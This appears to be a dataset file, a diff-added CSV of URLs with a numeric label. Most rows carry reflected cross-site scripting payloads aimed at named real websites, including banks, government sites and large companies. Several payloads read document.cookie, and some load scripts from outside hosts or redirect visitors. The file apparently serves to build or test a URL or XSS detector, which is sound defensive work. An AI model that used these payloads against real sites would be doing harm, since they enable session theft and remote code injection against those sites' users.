+http://au.msi.com/service/search/?kw=%22%3E%3Ciframe%20src=%22xssed.org%22%3E&type=product,0
+http://suivi.chronopost.fr/servletSuivi?langue=fr_FR&noLTList=@MaKyOtOx%0A%3Ciframe%20src=%22http://xssed.com%22%3E,0
+"http://www.scientology.org/churches/churches-of-scientology.html?video=org-cinn_tour"";</script><script>alert(/God hates you !/)</script><iframe src=http://xssed.com/></iframe>",0
+http://new.davidguetta.com/fr/taxonomy/term/111?destination=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%280x00D0F6%29%3C/script%3E,0
+http://www.davidguetta.com/fr/forum/110?page=1&form_build_id=form-1499b749b5a7c9b321d98efb96704d99&form_id=user_login_block&op=Connexion&destination=%27--%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cscript%3E,0
+"http://security.anti-abuse.com/index.php/""><script>alert(1)</script>",0
+http://www.manchesterproducts.com/search_detail.php,0
+http://www.avoe.ge/games/one.php?mid=%3Cscript%3Ealert%28/data/%29%3C/script%3E,0
+http://www.immobilier-pro-maroc.com/index.php?mod=annonce,0
+https://www.shacombank.com.hk/ibanking/dse/html/customer/zh_TW/INError.jsp?errCode=2163&encoding=zh_TW&errMode=AE%22;}document.write%28%22%3Ciframe%20src=%27http://xssed.com%27%3E%22%29;%20function%20test%28%29{var%20a=%22,0
+http://www.wilderssecurity.com/sendmessage.php,0
+http://games.ru.msn.com/?FORM=MSNRUC&mkt=ru-ru&act=search&query=%22%3E%3CSCRIPT+src=http://ltvn.pisem.net/aa.js+%3E%3C/SCRIPT%3E,0
+"http://commondatastorage.googleapis.com/chromium-browser-continuous/index.html?path=""><script>alert('XSS')</script>",0
+"http://chromium-browser-symbols.commondatastorage.googleapis.com/index.html?path=""><script>alert('XSS')</script>",0
+"http://www.biviumgroup.com/search.php?navi=search.php%3Fcategory_id%3D-1&job_search_text=""><script>alert(""DarkDevilZ / Mr.PaPaRoSSe"")</script>",0
+http://ar.netlog.com/go/search/view=people&q=%22%3E%3Cscript%3Ealert%281%29;%3C/script%3E&%22%3E%3Cscript%3Ealert%28511%29;%3C/script%3E=g,0
+http://www.tutorialsscripts.com/free-php-scripts/form-session-cookie-script/get-date-from-form-using-post-method.php,0
+http://www.elhacker.org/index.php?Ver=WebsHackeadas&botnot=16%22%3E%3Ciframe%20onload=alert%28/XSS/%29%3E,0
+http://www.125mashhad.ir/Default_.aspx?lang=1&sub=0&Page_=search&order=search&search=%3Cscript%3Ealert%28%27amirmagic%27%29%3C/script%3E,0
+https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/Logon?action=prepare&personalID=%22%3E%3Cscript%3Ealert(123)%3C/script%3E,0
+http://www.galatasaray.org/cnt.php?url=http://bit.ly/inbQKv,0
+http://archive.icann.org/cgi-bin/udrp/udrp.cgi?q=%22onmouseover=alert%280x0c2012%29%20bad=%22,0
+http://mobilecp.conduit.com/pages/Wizard?appId=677489db-2d88-4dbf-91a0-078a3d352e84,0
+http://wibiya.conduit.com/toolbar_password_recovery,0
+http://m.spiegel.de/empfehlen/a-823284-de.html,0
+http://www.spiegel.de/artikelversand/online/a-823270-de.html,0
+"http://www.toolboxrecords.com/fr/search//""><script>alert('Xss+By+Atm0n3r')</script>",0
+http://www.europeana.eu/portal/search.html?query=%3C%2Ftitle%3E+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,0
+http://bangalore.locanto.in/q/?query=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&group&dist=1,0
+http://static.brazzers.com/docs/ipp.php?site=%22%3E%3Ciframe%20onload=alert%28document.cookie%29%3E,0
+http://comidaslaredo.com/?m=cat&id=%27%3E%3Ciframe%20src=http://xssed.com%3E%3C/iframe%3E%3Cimg%20src=http://img848.imageshack.us/img848/8906/screenshot2012040516455.png%3E,0
+"http://www.europcar.bg/cgi-bin/feedback.cgi?LANG=""><script>alert(document.cookie)</script>",0
+http://mediathek.daserste.de/sendungen_a-z?buchstabe=</script><script>alert(navigator.userAgent)</script>,0
+"http://www.penumbrapress.ca/book.php?id=312<script>location=""http://www.Turkishajan.com/""</script>",0
+"http://www.europcarug.com/cgi-bin/feedback.cgi?LANG=""><script>alert(document.cookie)</script>",0
+"http://scully.cfa.harvard.edu/cgi-bin/feedback.cgi?U=""><script>alert(document.cookie)</script>",0
+http://apps.webtrends.com/wizard/?boot=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.fafich.ufmg.br/fil/busca.htm?srchtxt=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&srchlst=bd1.js&redirecionar=_top&sitesporpg=5&pagina=0,0
+"http://www.dcc.ufmg.br/pos/index.php?mensagem=%27;alert%28String.fromCharCode%2888,83,83%29%29///%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29///%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+http://www.milw0rm.nl/uc501/exploit.php?id=30,0
+http://amihackerproof.com/Results/index.php,0
+http://amihackerproof.com/Results/tos.php?scan_id=25988%3C/script%3E%3Cscript%3Ealert('XSS');%3C/script%3E,0
+"http://my.dot.tk/registration/mailsignup?firstname=""><script>alert('byebanyu.com.ar')</script>&lastname=fun",0
+"http://giochi.mobile.it.msn.com/cerca.php?search=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E",0
+http://usa.visa.com/locators/locator-gmap.jsp?locale=%22;alert(1)//,0
+"http://www.cbn.com/media/player/search.aspx?t=k&search='><script>alert(""by%20hac4ker"");</script>",0
+http://www.archive.org/account/login.php,0
+http://www.fenykepesajandek.eu/index.php?page=register,0
+http://www.akfinancialplanners.com//?page=companies&id=1446&name=%22%3E%3Ciframe%20src=http://hotturks.org/%3E/?page=companies&id=1446&name=%22%3E%3Cscript%3Ealert('TheLegend%20')%3C/script%3EDemo%20:%20http://mnhairremoval.com//?page=companies&id=1446&name=%22%3E%3Ciframe%20src=http://hotturks.org/%3E,0
+"http://www.npsinternational.com/product_detail.php?catid=1&pid=""><script>alert(1)</script>",0
+"http://www.yeeongems.com/product_detail.php?ID=5&CatID=""><script>alert(1)</script>",0
+"http://www.bridalroguegallery.co.uk/product_detail.php?catid=2&manid=1&prodid=""><script>alert(""Virtual_SystEm"")</script>.",0
+"http://www.yatashomeaydin.com/tr/urunlerimiz_detay.php?idurun=""><script>alert(1)</script>",0
+http://trapster.com/forgot-password.php,0
+http://www.vtt.fi/personsearch/jsp/findperson.jsp?sn=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,0
+http://www.picpiggy.com/list.php?q=pwn+%3CSCRIPT/SRC=%22http://tmp.vgood.com.tw/poc.js%22%3E%3C/SCRIPT%3E+pwn,0
+http://video.tellytube.in/list.php?q=pwn+%3CSCRIPT/SRC=%22http://tmp.vgood.com.tw/poc.js%22%3E%3C/SCRIPT%3E+pwn,0
+"https://uyeler.mynet.com/index/pwdremind_byemail.jsp?u=<script>alert(""HEYYO OFFICIAL"")</script>",0
+http://www.softforall.com/searchresults.php,0
+https://hosting.html.com/cgi-bin/wairs/signup.cgi,0
+http://www.race.com/checkavailability/index.php?zipcode=%22%2F%3E%3Cscript%3Ealert%28%22XSS%3A+Vijayendra%22%29%3C%2Fscript%3E&go=GO&page=results,0
+http://pakistanstores.com/feedback.php,0
+http://www.iibf.org.in/scripts/SearchResults.asp?sitequery=%22%2F%3E%3Cscript%3Ealert%28%22XSS%3A+Vijayendra%22%29%3C%2Fscript%3E&x=22&y=7,0
+http://www.rutv.ru/?d=0'%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,0
+http://www.creanous.com/,0
+"http://bank-maskan.ir/Page.aspx?search=""><script>alert('By :Takpar')</script>&mID=1418&Page=search/advancedsearch",0
+http://caloriecount.about.com/cc/search.php?searchpro=%3Cbody%20onload=alert(1)%3E&search_type=foods,0
+http://inspeak.com/index.php?APP_current_action=viewmodule&APP_current_module=%3Cscript%3Ealert%28123%29;%3C/script%3E,0
+http://people.w3.org/rishida/utils/subtags/index.php?find='%22%3E%3C%3Cscript%3Ealert(1)%3C/script%3E%3E&submit=Find,0
+"http://goodtimes.ndtv.com/video/video.aspx?id=52733"">'><script>alert(/Hey do you know that it isboring T.T/)</script>",0
+"http://goodtimes.ndtv.com/video/videosearchlisting.aspx?keyword='>""><script>alert(/Hexon/)</script>",0
+http://lcci.com.pk/dir_search_result4.php,0
+http://sfdoccentral.symantec.com/admin/contact_us.php,0
+"http://find.scourt.go.kr/cgi-bin/homepage.cgi?option=FULL&query=""><script>alert(123)</script>",0
+http://www.mke.go.kr/common/search/wnsearch.jsp?collection=all&startCount_info=0&startCount=0&cate=0&query=%22%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E,0
+http://ringtones.nl.msn.com/games.php?rtch=1&rtlo=%22%3E%3C/title%3E%3Cstyle%3Ebody{visibility:hidden;}%20html{background-color:%20Black;}%3C/style%3E%27%22%3E%3Cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%E2%80%8B%E2%80%8Bz-index:%2010;visibility:%20visible;%20color:%20White;%20font-size:%2020px;%22%3E%3Cimg%20src=%22http://img257.imageshack.us/img257/3733/77822687.png%22%20style=%22height:%20400px;%20width:%20600px;%22%20alt=%22By%20Sony%22%3E%3Cbr%3Eby%20Sony%3Ciframe%20src=%22http://insecurity.ro%22%3E,0
+"http://search.dilbert.com/search?w="" onmouseover=""alert(1);"" alt=""&x=0&y=0",0
+http://quazen.com/?s=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,0
+http://cricketnext.in.com/search/searchnews.php?search_value=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&x=0&y=0,0
+"http://www.engadget.com/galleries/tag/%3Cbody%20onload=alert(String.fromCharCode(88,83,83))%3E",0
+http://www.wolframalpha.com/input/?i=mandelbrot&a=*C.mandelbrot-_*Formula.dflt-&f2=-0.5&f=MandelbrotSet.rec_-0.5&f3=666&f=MandelbrotSet.imc_666%22%20alt=%22MandelbrotSet.imc%22%20%20name=f3%20/%3E%3Cbody%20onload=alert(%22XSS%22)%3E%3Cspan,0
+http://www.megavideo.com/?c=profile&user=%22onfocus=alert%281%29%20/%3E,0
+http://disneyland.disney.go.com/?name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3E[XSS%27D%20by%20X3R0%20|%20ProHack%20]%3C/h1%3E%3C/marquee%3E&bhcp=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3E[XSS%27D%20by%20X3R0%20|%20ProHack%20]%3C/h1%3E%3C/marquee%3E,0
+http://www.symantec.com/flash/podcastPlayer.swf?file=http://www.gabbyattic.com/jokes/put%20down%20the%20gun.mp3&autoStart=false&songVolume=90,0
+http://www.real.com/realone/trial_terms.html?src=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+https://hire.jobvite.com/Login/Login.aspx,0
+http://www.xl.pt/cgi-bin/pesquisa/semanainformatica.cgi,0
+http://www.xl.pt/cgi-bin/pesquisa/maximainteriores.cgi,0
+https://store1.adobe.com/cfusion/lad/xml.cfm?groupCode=SeeMe+%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E+SeeMe&method=getLocalizedLabelsByGroup&uc=1&loc=en_us,0
+http://doctor.ndtv.com/Search.aspx?SearchText=harvey><script>alert(document.cookie)</script>&site=searchtextbox-5555,0
+http://www.mediametrie.com/recherche.php?do=search&keywords=%3Cscript%3Ealert%28%22XSS.by.03storic%22%29%3C%2Fscript%3E%3Ciframe+src%3D%22http%3A%2F%2Fvuln.xssed.net%2Fxssed.gif%22%3E&where=1&x=0&y=0,0
+http://www.rockware.com/home/searchResult.php?searchQuery=%3Cscript%3Ealert%28%22XSS.by.03storic%22%29%3C%2Fscript%3E&x=23&y=6,0
+"http://l.yimg.com/m/ver/270.0/embed-2008-08-14-1438/fullscreen.html?&seek=0&kbps=0&eAutoStart=""><script>alert('XSS')</script>",0
+http://www.ghana50.gov.gh/tourism/index.php?op=getAshantisiteInfo&id=<script>alert(document.cookie)</script>,0
+http://nas.mbc.net/grp_article.php?article=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+https://careerlaunch.jpl.nasa.gov/ci20/index.jsp?applicationName=%22%3E%3Cimg%20src=http://i48.tinypic.com/dw5dkz.png%3E%3C/img%3E,0
+http://www.scene.org/newfiles.php?dayint=7&dir=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E,0
+"http://www.inreda.com/showProductsDetail.asp?pID=10653&cID=67&agrID='';!--""onclick=""alert('XSS')""=&{()}",0
+http://www.vatican.va/redemptoris_mater/flash/index.html?lingua=it%22----%3E%3E''%3E%3Cscript%3Ealert('XSS')%3C/script%3E,0
+http://ru.akinator.com/valide_contacte.php,0
+http://pt.akinator.com/valide_contacte.php,0
+"http://populus.es.msn.com/participa.aspx?nombre=""</script><script>if (1){alert(1);//",0
+http://login.community.virgilio.it/community/people.html?a2_chId=people&a2_finUrlOk=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://tv1.rtp.pt/EPG/radio/programas/index.php?palavra=%3E%22%3E%3Ciframe+src%3D%22http://xssed.com%22%3E,0
+"http://filmtrailer.msn.se/index.php?module=filmnews&operation=""><script>alert(document.cookie)</script>",0
+http://tube.aeiou.pt/?s=%3E%22%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E,0
+http://www.weather.com/search/enhanced?what=Weather36HourBusinessTravelerCommand&config=SZ=160x600*WX=FHW*LNK=SSNL*UNT=F*BGI=winter*MAP=null|null*DN=www.webhackdesigns.com*TIER=0*PID=1054060864*MD5=da536c3570c12825843d811c6ea7cd31&par=WOWs0_1054060864&site=160x600&cm_ven=WOWs0&cm_cat=160x600&code=link&promo=searchbox&cm_ite=link&cm_pla=searchbox&where='%22%3E%3Ciframe%20src=http://thehacking.org/%3E,0
+http://search.ironspeed.com/search?q=%22%3E%3Cscript%3Ealert(%22xssed%22);%3C/script%3E&btnG.x=0&btnG.y=0&btnG=Search&restrict=AllHelp&site=c1&output=xml_no_dtd&client=c1&proxystylesheet=http%3A%2F%2Fwww.ironspeed.com%2Fsearch%2Fkbstyle.xsl,0
+http://tag.mmosite.com/search.php?q=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E&button=+,0
+http://fzr78.multiply.com/guestbook%7D%3C/style%3E43%27%22%3E%3C/title%3E%3Cscript%3Ea=eval;b=alert;a(b(/XSS/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS%3C/h1%3E%3C/marquee%3E,0
+http://pacoma.multiply.com/guestbook%27%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS%3C/h1%3E%3C/marquee%3E,0
+http://members.driverguide.com/doc.php?page=%22%3E%3Chtml%3E%3Cscript%3Ealert(1337)%3C/script%3E,0
+http://www.kongregate.com/games/armorgames/%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E,0
+http://www.dunav.com/Site/Search.php?intLangID=10&intCategoryID=227&q=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&x=7&y=10,0
+http://www.dunav.com/pretraga/pretraga.php?trazi=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&sta=1,0
+http://www.cafemontenegro.com/index.php?search=%22%3E%3CSCRIPT%20SRC=http://scras.freehostia.com/script.js%3E%3C/SCRIPT%3E,0
+"http://www.lsi.com/DistributionSystem/User/Registration.aspx?pid=%22%20onMouseOver=alert(String.fromCharCode(120,115,115))%20fake=%22 [Mouse-over 'Register' link on top right]",0
+http://www.lefigaro.fr/palmares-lycees/recherche.php?etab=%22%3E%3Cscript%3Ealert(1337)%3B%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+WARVECTOR+%3D)%3C%2Fh1%3E%3C%2Fmarquee%3E&comm=%22%3E%3Cscript%3Ealert(1337)%3B%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+WARVECTOR+%3D)%3C%2Fh1%3E%3C%2Fmarquee%3E&x=0&y=0&type=general,0
+http://money.impaqmsn.com/content.aspx?id=%3Ciframe%20src%3D%22JaVaScRiPt:alert%28%28%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%27%29%29%3B%22%3E&ch=354,0
+"http://ph.msn.astroyogi.com/login_main.asp?services=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY</h1>",0
+"http://gamezone.impaqmsn.com/gamelist.asp?fl=genre%2Ename&kw=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY</h1>",0
+http://www.weather.com/outlook/recreation/outdoors/search?where=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E&start_with=1&search_loc_type=13&x=24&y=12,0
+http://blog.ok.net/skyr3x/page/2414/%22%3E%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E/,0
+http://haber.ok.net/sorgula.html?sorgula=true&anahtar=%22%3E%3C/title%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,0
+"http://www.travbuddy.com/register.php?mapid=""><script>alert(1);</script>",0
+http://fr.predictor.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E,0
+http://en.predictor.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E,0
+http://es.predictor.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E,0
+http://de.predictor.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E,0
+http://chicago.citysearch.com/listings/chicago-il-metro/_script_alert_xss_by_w4r3z_script_/82078?what=%3Cscript%3E+alert+(%22xss+BY+w4r3z%22)+%3C%2Fscript%3E,0
+"http://www.americasarmy.com/vidpop.php?filePath=""><script>alert(""XSS Found By Rugburn"")</script>",0
+"http://www.airfrance.co.jp/cgi-bin/AF/JP/ja/local/transverse/system/redirection.jsp?URL_REDIRECTION=http://google.com""; alert(1); //",0
+http://www.airfrance.com/cgi-bin/AF/FR/fr/local/transverse/system/redirection.jsp?URL_REDIRECTION=http://google.com%22;%20alert%281%29;%20//,0
+"http://www.airfrance.fr/cgi-bin/AF/FR/fr/local/transverse/system/redirection.jsp?URL_REDIRECTION=http://google.com""; alert(1); //",0
+http://www.keywordspy.com.br/overview/domain.aspx?q=DcbBizz.com/out.php?id=%22%3E%3Cscript%3Ealert(%27illuz1oN@r00tDefaced.net%27)%3C/script%3E,0
+"http://www.mysql.ru/webboard/search.html?text=""><script>alert(String.fromCharCode(88,83,83))</script>",0
+http://msn.iproperty.com.my/modules/property/listingsearch.aspx?searchType=EP&propertyType=AR&state=KL&city=%3CScRiPt%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20MSN%20Malaysia%20:D%27);%3C/ScRiPt%3E&minPrice=0&maxPrice=100000000&x=&y=&s=1&r=0,0
+"http://linkdefteri.com/sitegit.php?id=22829=""><script>alert(document.cookie)</script><marquee>ThR0ad</marquee>",0
+"http://linkdefteri.com/uclu.php?istek=yeniler=""><script>alert(document.cookie)</script><marquee>ThR0ad</marquee>",0
+http://showing.com/search/videos/?s=%22%3E%3Cscript%3Ealert(%27xssed%27)%3C/script%3E,0
+http://sportsillustrated.cnn.com/partners/redirects/tracking.html?http://google.com,0
+http://sports.sportsillustrated.cnn.com/racingfront.asp?series='); alert(1);//</script>,0
+"http://www.saab.lv/main/GLOBAL/en/tirdzn_lietoti1.shtml?id=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>",0
+"http://www.saab.hu/hirek-sajtoinformaciok/hirlevel?form%5Bname%5D=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>",0
+"http://www.saab.bg/test-drajv?form%5Bname%5D=111-222-1933email@address.tst&form%5Bemail%5D=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>",0
+"http://www.saab.ro/drive-test?form%5Bname%5D=111-222-1933email@address.tst&form%5Bemail%5D=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>",0
+http://europa.eu/youth/forgotpass.cfm?cPage=2&l_id=EN&mail=%3Cscript%3Ealert(document.cookie)%3C/script%3E,0
+http://mitnicksecurity.com/workshop_signup.php,0
+http://www.madeinitaly.gov.it/mibd/find_italian_partner_directory.php?Testo=%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E&Tipologia=una&Dove=inTutte&Attivita=,0
+http://www.forth.gr/ncp/search.php,0
+http://shop.nationalgeographic.com/ngs/facet/facetGlossary.jsp?_dyncharset=UTF-8&_dynSessConf=6134326913753448789&trailSize=1&advancedSearch=true&liveResult=true&categoryId=&trail=&addFacet=19016%3A1%3ASRCH%3A%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&removeAllFacets=true&categoryFacetId=9004&trailtext=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&searchmenu=allCategories&search.x=16&search.y=17,0
+http://www.ebay.com/sch/i.html?_from=R40&_trksid=m570.l1313&_nkw=%27%22type=%22image%22%20src=%22xss.jpg%22%20onerror=%22alert%28document.cookie%29%22%20c=%22&_sacat=15032,0
+http://technologygateway.nasa.gov/index.cfm?fuseaction=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,0
+https://iclass.eccouncil.org/?fontstyle=%22onmouseover=alert%28/XSS/%29%20%22,0
+http://thegioiwebsite.net/tin-tuc/?action=view&pcatid=78%22%3E%3Cscript%3Ealert%281%29%3C/script%3E&scatid=86&newsid=71,0
+http://client.skype.tom.com/product/index.php?form_country=%E7%BE%8E%E5%9B%BD%22%3E%3CscRipt%3Ealert%28document.cookie%29%3C/SCript%3E,0
+https://mep.pandasecurity.com/?action=rememberPassword&login=gjuipqgc&userKind=%22%3E%3Ciframe%20onload=alert%28/XSS/%29%3E,0
+http://ghrc.nsstc.nasa.gov/hydro/search.pl?hydro&pr=<script>alert('cyberbellona')</script>,0
+http://catalogue.adidas.com/catalogue/ae/products/?keywords=%22;%20alert%28/xss/%29;%20test=%22test,0
+http://www.hcltech.com/search/apachesolr_search/%3Cfont%20size=24%20color=red%3EAnshul%20katta%20found%20XSS%3C/font%3E%3Ciframe%20src=%22http://anshulkatta.blogspot.com%22%3E%3C/iframe%3E%3Cscript%3Ealert%28%22anshul%20katta%20found%20xss%22%29;alert%28document.cookie%29%3C/script%3E,0
+http://www.college.harvard.edu/icb/icb.do?keyword=k61161&pageid=icb.page316368&pageContentId=icb.pagecontent828781&view=view.do&state=maximize&viewParam_q=<script>alert(/xss/)</script>,0
+http://noticias.uol.com.br/busca/?q=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E&rd=1&id=1&ads=on&ref=noticias_uol#q=ssssss,0
+http://www.safedrive.ge/_old/news.php?page=acs&lang=eng&p=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://unlock.tacobell.com/unlock/?error=Please%20verify%20that%20you%27re%20not%20a%20bot%20by%20completing%20the%20image%20captcha.%3Cscript%3Ealert%28%22Give%20ME%20CODEZ%20NOWZ!!!%22%29%3C/script%3E,0
+http://www.windows7download.com/software-search.html?keywords=%22%27%3E%3C/title%3E%3Cimg%20hidden=true%20src=x%20onerror=alert%28%27XSSED%27%29%3E,0
+http://www.jwcoca.qld.gov.au/02_cal/index.asp?varKeyword=%22%3E%3Cscript%3Ealert%28%2FXSS%20by%2003storic%2F%29%3C%2Fscript%3E&imageField.x=11&imageField.y=5,0
+http://realty.yandex.ru/search.xml?type=SELL&category=APARTMENT'%2Balert%28%22XSS%22%29%2B',0
+http://www.nrc.gov/public-involve/public-meetings/index.cfm?fuseaction=Search.Detail&NS=0&MC=%3Ch1%3Ehacked%20by:%20WWW.ALPACAHACK.COM%3C/h1%3E%3Ciframe%20src=%22http://xssed.com%22%3E,0
+http://www.ox.ac.uk/applications/contact_search/index.rm?site=%3Ch1%3Ehacked%20by%20ALPACAHACK.COM%3C/h1%3E%3Ciframe%20src=%22http://xssed.com/%22%3E%3C!--,0
+"http://www.ucoatit.com/shop/error.asp?msg=<iframe src=""http://xssed.com"">",0
+"http://www.subisu.net.np/news/?cat=News""><script>alert(""XSS-by-Himanshu"");</script>",0
+http://www.andaluciainformacion.es/sistema/index.asp,0
+http://uk.ask.com/advancedsearch?o=0&l=dir&qsrc=167&q=%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3Ealert%28%22+XSS-BG%22%29%3C%2Fscript%3E,0
+http://openid-rp.virgilio.it/openid-rp/rpLogin?entryPoint=VirgilioOpenID&urlRitorno=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+"https://www.ohloh.net/p/filezilla/download?filename=<script>alert(""XSSed by SepyanseR"")</script>",0
+http://busca.globo.com/Busca/g1/?query=<script>alert(document.cookie)</script>,0
+http://www.agenbolsa.com/agenbolsa/index.php?ph=buscador,0
+http://www.feedage.com/subscribe.php?fid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.peopleconnectionblog.com/search/?q=%3Ciframe+src+%3Dhttp%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DGmGIT16P-lI%22+width%3D%221000%22+height%3D%221000%22+\%3E%3C%2Fdiv%3E&blog_submit=GO,0
+http://de.truveo.com/search?query=%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert%28%22xss+%22%29%3C%2Fscript%3E%3Ciframe+src+%3Dhttp%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DwOCCgblEvcE%22+width%3D%221000%22+height%3D%221000%22+\%3E%3C%2Fdiv%3E,0
+http://it.altervista.org/wiki/index.php?search=%3C%2Ftitle%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ns0=1&title=Speciale%3ARicerca&fulltext=Search&fulltext=Ricerca,0
+"http://chat.stackexchange.com/?tab=site&sort=active&nohide=true&host=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://www.gallimard.fr/Gallimard-cgi/Appli_catal/liste.pl?fctx=1329503444&BMin=31&BMax=38&flag=&tri=ac&rub=collection&nucol=103000000&nb_T=38""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.melih.com/wp-content/themes/melih-new/video.php?f=%22%20onmouseover=alert(String.fromCharCode(88,83,83))%20bad=%22",0
+http://www.jouezetgagnez.net/index.php?email=xss%40gmail.com&nom=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&prenom=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&civilite=H&zipcode=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&day_birthdate=16&month_birthdate=3&year_birthdate=1952&newsletter=on&x=169&y=26,0
+http://cassons-les-idees-recues.com/p1.php?ml=/%22%3E%3Cscript%3Ealert%281%29%3C/script%3Efb71df71a0b2999179447d2beec66f37&O=4177&p=FR&SI=GA_JAN,0
